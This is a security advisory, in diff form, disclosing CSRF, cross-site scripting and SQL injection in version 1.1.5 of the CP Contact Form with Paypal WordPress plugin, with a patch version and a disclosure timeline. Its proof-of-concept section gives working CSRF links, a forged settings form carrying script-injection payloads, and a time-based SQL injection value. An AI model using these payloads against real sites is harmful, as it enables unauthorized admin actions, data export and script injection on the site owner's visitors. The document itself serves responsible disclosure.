@@ -1,0 +1,93 @@
+# Title: Cross-Site Request Forgery, Cross-Site Scripting and SQL Injection
+in CP Contact Form with Paypal Wordpress Plugin v1.1.5
+# Submitter: Nitin Venkatesh
+# Product: CP Contact Form with Paypal Wordpress Plugin
+# Product URL: https://wordpress.org/plugins/cp-contact-form-with-paypal/
+# Vulnerability Type: Cross-site Request Forgery [CWE-352], Cross-site
+scripting[CWE-79], Improper Neutralization of Special Elements used in an
+SQL Command ('SQL Injection')[CWE-89]
+# Affected Versions: v1.1.5 and possibly below.
+# Tested versions: v1.1.5
+# Fixed Version: v1.1.6
+# Link to code diff:
+https://plugins.trac.wordpress.org/changeset?new=1166955%40cp-contact-form-with-paypal&old=1162550%40cp-contact-form-with-paypal
+# Changelog:
+https://wordpress.org/plugins/cp-contact-form-with-paypal/changelog/
+# CVE Status: None/Unassigned/Fresh
+
+## Product Information:
+
+With CP Contact Form with Paypal you can insert a contact form into a
+WordPress website and connect it to a PayPal payment.
+
+## Vulnerability Description:
+
+The forms in the admin area of the plugin allows CSRF. This gives the
+capacity for the attacker to add new forms, modify existing form settings,
+launch XSS attacks, export CSV files of the messages, delete forms, and
+perform SQL Injection.
+
+## Proof of Concept:
+
+<h3>CSRF - Action Links</h3>
+<ul>
+<li><a href="
+http://localhost/wp-admin/admin.php?page=cp_contact_form_paypal&a=1&r=0.9305673889626347&name=csrf1">Create
+form/item</a></li>
+<li><a href="
+http://localhost/wp-admin/admin.php?page=cp_contact_form_paypal&cal=2&list=1&search=&dfrom=&dto=&cal=2&cp_contactformpp_csv=Export+to+CSV">Export
+to CSV</a></li>
+<li><a href="
+http://localhost/wp-admin/admin.php?page=cp_contact_form_paypal&c=2&r=0.4520871591860098">
+Clone form/item</a></li>
+<li><a href="
+http://localhost/wp-admin/admin.php?page=cp_contact_form_paypal&u=6&r=0.558320934244582&name=csrf1">Update
+form/item</a></li>
+<li><a href="
+http://localhost/wp-admin/admin.php?page=cp_contact_form_paypal&d=3&r=0.2828470980050731">Delete
+form/item</a></li>
+</ul>
+
+
+<h3>CSRF, XSS, SQLi - Settings form</h3>
+<form action="
+http://localhost/wp-admin/admin.php?page=cp_contact_form_paypal&cal=11&r=0.81280830806042"
+method="post">
+<input type="hidden" name="cp_contactformpp_post_options" value='' />
+
+<!--
+if cp_contactformpp_id is injected with XSS, the other script vectors won't
+work
+<input type="hidden" name="cp_contactformpp_id"
+value='"><script>alert(3);</script>' />
+
+SQL injection possible cp_contactformpp_id
+<input type="hidden" name="cp_contactformpp_id" value="1 AND SLEEP(25)" />
+-->
+
+<input type="hidden" name="cp_contactformpp_id" value='11' />
+<input type="hidden" name="fp_from_email" value='asd@evilcorp.org' />
+<input type="hidden" name="fp_message" value='The following contact message
+has been sent:<%INFO%>&lt;/textarea&gt;<script>alert(1);</script>' />
+<input type="hidden" name="cu_message" value='Thank you for your message.
+We will reply you as soon as possible.This is a copy of the data
+sent:<%INFO%>Best Regards.&lt;/textarea&gt;<script>alert(2);</script>' />
+<input type="hidden" name="submit" value='Save Changes' />
+<input type="submit" value="submit" />
+</form>
+
+## Solution:
+
+Upgrade to v1.1.6
+
+## Disclosure Timeline:
+
+2015-05-19 - Discovered. Contacted developer on support forums.
+2015-05-20 - Mailed developer initial report
+2015-05-25 - Patched v1.1.6 released
+2015-07-09 - Publishing disclosure to FD
+
+## Disclaimer:
+
+This disclosure is purely meant for educational purposes. I will in no way
+be responsible as to how the information in this disclosure is used.
